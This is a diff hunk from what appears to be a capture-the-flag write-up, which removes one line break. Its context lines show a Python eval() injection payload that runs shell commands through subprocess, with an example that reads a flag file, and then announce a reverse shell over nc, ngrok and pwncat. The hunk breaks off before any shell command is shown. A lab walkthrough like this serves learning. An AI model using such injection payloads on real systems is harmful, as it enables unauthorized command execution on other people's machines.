@@ -76,7 +76,6 @@ Now we can try logging in.
 Sweet! `eval()` = free shell.
 By running the following code, we can execute commands on the target machine: `eval('__import__("subprocess").getoutput("<COMMAND>")')`.
 We can get the flag by running `eval('__import__("subprocess").getoutput("cat /home/intern/user.txt")')`, but it would be more interesting if we get bind or reverse shell. There are many different ways of opening any of these shells, but as the system has `nc`, I will go with it.
-<br />
 So, I will use reverse shell using ngrok to bypass my home router firewall and to keep my public IP private and `pwncat` for more stable shell.
 ### On our machine
 ```
